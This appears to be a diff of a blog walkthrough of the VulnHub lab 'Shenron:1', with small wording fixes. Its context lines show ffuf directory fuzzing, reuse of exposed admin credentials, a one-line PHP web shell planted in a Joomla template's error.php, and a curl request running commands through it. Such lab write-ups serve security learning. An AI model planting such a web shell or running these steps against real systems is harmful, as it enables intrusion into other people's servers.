@@ -40,7 +40,7 @@ In a real-world scenario, the default page might be left temporarily during the 
 ```ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.0.2.4/FUZZ```<br><br>
 ![Directory Fuzzing](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/dir-fuzzing-1.png)
 
-The fuzzing process uncovers two interesting directories which are the *test* and *joomla*. The directory joomla already gives us a hint that the web application may be running the well-known Joomla CMS. Let's browse these directories chronologically as they are in our results. Upon browsing to the test directory, we noticed that directory listing is enabled, which constitutes a vulnerability since it appears to expose a file containing passwords. We should document this finding in our Findings folder.
+The fuzzing process uncovers two interesting directories which are the *test* and *joomla*. The directory Joomla already gives us a hint that the web application may be running the well-known Joomla CMS. Let's browse these directories chronologically as they are in our results. Upon browsing to the test directory, we noticed that directory listing is enabled, which constitutes a vulnerability since it appears to expose a file containing passwords. We should document this finding in our Findings folder.
 ![Directory Listing](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/directory-listing.png)
 
 Accessing the file reveals a pair of credentials for an admin user. We can keep a note of these credentials in a file.
@@ -54,7 +54,7 @@ Nex let's visit the second directory *joomla* uncovered during our fuzzing. We c
 Great, we successfully logged in as the admin. Next, we move to Extensions -> Templates -> Templates where attempt to add a PHP shell to a PHP file in an unused template. Here, I chose the protostar template and added a basic PHP shell ``` system($_GET["cmd"]);``` to the error.php file.
 *NB: In a real-world penetration test try to use a more complicated name for the GET parameter value such as a hash. This is because anyone can access that file hence if a common name is used, attackers may bruteforce it and also use it to establish their foothold in your client's environment.*
 ![Template Modification](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/template-modification.png)
-After modifying the template we can now execute commands on our target by browsing to the page and specify the command we want to run as the GET parameter's value.<br> 
+After modifying the template we can now execute commands on our target by browsing to the page and specifying the command we want to run as the GET parameter's value.<br> 
 ```curl http://10.0.2.4/joomla/templates/protostar/error.php?cmd=id```<br><br>
 ![RCE Test](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/rce-test.png)
 
